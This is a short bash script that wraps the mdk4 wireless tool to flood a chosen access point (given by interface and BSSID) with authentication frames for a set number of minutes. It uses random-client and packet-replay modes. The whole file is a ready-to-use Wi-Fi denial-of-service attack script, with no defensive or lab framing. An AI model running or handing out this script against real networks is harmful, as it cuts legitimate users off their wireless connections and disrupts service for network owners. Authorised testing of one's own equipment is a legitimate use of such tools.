#!/bin/bash


if [ "$#" -lt 3 ]
then
    echo "[*] Usages: ./authDOS.sh {Interface_name} {BSSID} {Miniutes}"
    exit 1
fi

if [ "$#" -eq 3 ]
then
    # -a BSSID send random data from random clients to try the DoS
    timeout $3m mdk4 $1 a -a $2 -m 
    # -i BSSID capture and repeat pakets from authenticated clients
    timeout $3m mdk4 $1 a -i $2 -m   
fi